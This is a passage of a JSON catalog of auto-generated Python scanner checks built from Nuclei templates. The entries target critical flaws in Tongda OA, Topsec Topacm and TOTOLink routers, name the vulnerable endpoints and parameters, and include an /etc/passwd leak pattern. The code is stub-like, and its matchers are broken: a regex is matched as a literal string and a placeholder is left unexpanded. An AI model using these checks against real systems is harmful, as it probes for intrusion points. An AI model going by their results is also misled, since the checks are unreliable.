        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-getway-rfi\nName: Tongda OA v11.8 getway.php - Remote File Inclution\nSeverity: critical\nDescription: There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_getway_rfi:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-getway-rfi\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.8 getway.php - Remote File Inclution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_1, \"ERROR URL\"); contains(body_2, \\'GET\\') || contains(body_2, \\'POST\\')'\n\n        # Simple word matcher simulation\n        matchers = ['GET', 'POST']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.8 getway.php - Remote File Inclution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_getway_rfi(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-getway-rfi\nName: Tongda OA v11.8 getway.php - Remote File Inclution\nSeverity: critical\nDescription: There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_getway_rfi:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-getway-rfi\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v11.8 getway.php - Remote File Inclution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_1, \"ERROR URL\"); contains(body_2, \\'GET\\') || contains(body_2, \\'POST\\')'\n\n        # Simple word matcher simulation\n        matchers = ['GET', 'POST']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v11.8 getway.php - Remote File Inclution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_getway_rfi(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "tongda",
          "rfi",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_topsec_topacm_rce",
        "name": "Topsec Topacm - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{randstr}}' | mot(s) 'text/plain' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: topsec-topacm-rce\nName: Topsec Topacm - Remote Code Execution\nSeverity: critical\nDescription: Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_topsec_topacm_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"topsec-topacm-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Topsec Topacm - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{randstr}}' | mot(s) 'text/plain' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Topsec Topacm - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_topsec_topacm_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: topsec-topacm-rce\nName: Topsec Topacm - Remote Code Execution\nSeverity: critical\nDescription: Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_topsec_topacm_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"topsec-topacm-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Topsec Topacm - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{randstr}}' | mot(s) 'text/plain' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Topsec Topacm - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_topsec_topacm_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "topsec",
          "topacm",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_totolink_boaform_rce",
        "name": "TOTOLink Router - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code==200; contains(tolower(body), \"totolink\") / [AND] regex ['root:.*:0:0:'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: totolink-boaform-rce\nName: TOTOLink Router - Remote Command Execution\nSeverity: critical\nDescription: TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_totolink_boaform_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"totolink-boaform-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"TOTOLink Router - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code==200; contains(tolower(body), \"totolink\") / [AND] regex [\\'root:.*:0:0:\\'] | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TOTOLink Router - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_totolink_boaform_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: totolink-boaform-rce\nName: TOTOLink Router - Remote Command Execution\nSeverity: critical\nDescription: TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_totolink_boaform_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"totolink-boaform-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"TOTOLink Router - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = 